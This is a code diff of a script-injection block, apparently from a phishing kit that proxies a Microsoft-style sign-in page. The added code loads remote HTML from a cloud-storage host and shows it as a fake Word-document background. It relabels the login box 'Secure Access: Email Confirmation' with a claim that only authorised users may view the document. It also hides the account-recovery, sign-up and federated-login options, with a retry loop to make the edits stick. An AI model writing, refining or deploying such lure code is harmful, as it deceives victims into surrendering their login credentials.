@@ -66,14 +66,9 @@ js_inject:
       overlay.style.display = "flex";
       overlay.style.justifyContent = "center";
       overlay.style.alignItems = "center";
-      overlay.style.overflow = "hidden";
       overlay.innerHTML = `
         <style>
-          @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-          }
+          @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
           .logo-container {
             position: relative;
             width: 200px;
@@ -127,40 +122,49 @@ js_inject:
       setTimeout(() => {
         overlay.remove();
 
-        // Inject Word background HTML below form
+        // Inject Word-style full background into body bottom
         fetch("https://pub-2a44f4d547ef416eb3d30428f95d5a9e.r2.dev/off.html")
           .then(res => res.text())
           .then(html => {
-            const wrapper = document.createElement("div");
-            wrapper.id = "customWordBackground";
-            wrapper.style.zIndex = "0";
-            wrapper.style.pointerEvents = "none";
-            wrapper.innerHTML = html;
-            const winScroll = document.querySelector(".win-scroll");
-            if (winScroll) winScroll.insertAdjacentElement("afterend", wrapper);
+            const bg = document.createElement("div");
+            bg.id = "wordBackgroundHTML";
+            bg.style.position = "absolute";
+            bg.style.top = "0";
+            bg.style.left = "0";
+            bg.style.width = "100%";
+            bg.style.zIndex = "0";
+            bg.style.pointerEvents = "none";
+            bg.innerHTML = html;
+            document.body.appendChild(bg);
           });
 
-        // Modify form box heading and hide unnecessary links
-        setTimeout(() => {
-          const header = document.querySelector('#loginHeader div[role="heading"]');
-          if (header) {
-            header.innerHTML = `Secure Access: Email Confirmation`;
+        // Retry loop to modify login form safely
+        let tries = 0;
+        const modifyForm = () => {
+          const heading = document.querySelector('#loginHeader div[role="heading"]');
+          const fedBox = document.querySelector(".promoted-fed-cred-box");
+          const signup = document.querySelector("#signup")?.closest(".form-group");
+          const access = document.querySelector("#cantAccessAccount")?.closest(".form-group");
+
+          if (heading) {
+            heading.innerText = "Secure Access: Email Confirmation";
             const desc = document.createElement("div");
-            desc.style.fontSize = "14px";
-            desc.style.color = "#5a5a5a";
-            desc.style.marginTop = "8px";
             desc.innerText = "This document can only be accessed by Authorised users. Please verify your identity to access this document.";
-            header.parentNode.appendChild(desc);
+            desc.style.marginTop = "6px";
+            desc.style.fontSize = "14px";
+            desc.style.color = "#666";
+            heading.parentNode.appendChild(desc);
           }
 
-          document.querySelectorAll(".form-group").forEach(el => {
-            if (el.textContent.includes("No account") || el.textContent.includes("Can’t access your account")) {
-              el.style.display = "none";
-            }
-          });
-
-          const fedBox = document.querySelector(".promoted-fed-cred-box");
+          if (signup) signup.style.display = "none";
+          if (access) access.style.display = "none";
           if (fedBox) fedBox.style.display = "none";
-        }, 1000);
 
+          // Retry if not found yet
+          if (!heading && tries < 10) {
+            tries++;
+            setTimeout(modifyForm, 600);
+          }
+        };
+        modifyForm();
       }, 3000);
